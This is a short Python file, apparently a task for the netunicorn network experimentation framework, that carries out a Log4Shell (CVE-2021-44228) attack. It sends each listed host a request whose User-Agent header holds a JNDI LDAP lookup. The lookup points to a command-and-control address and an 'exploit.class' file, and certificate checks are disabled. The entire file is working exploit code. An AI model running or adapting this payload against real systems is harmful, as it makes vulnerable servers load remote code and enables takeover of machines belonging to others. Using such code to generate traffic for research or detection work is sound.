from netunicorn.base import Task


class CVE202144228(Task):
    requirements = ["pip install requests"]

    def __init__(self, cc_address: str, hosts: list[str]):
        self.hosts = hosts
        self.cc_address = cc_address
        super().__init__()

    def run(self):
        import requests as r

        for host in self.hosts:
            r.get(
                f"https://{host}/",
                headers={'User-Agent': f'${{jndi:ldap://{self.cc_address}/exploit.class}}'},
                verify=False
            )
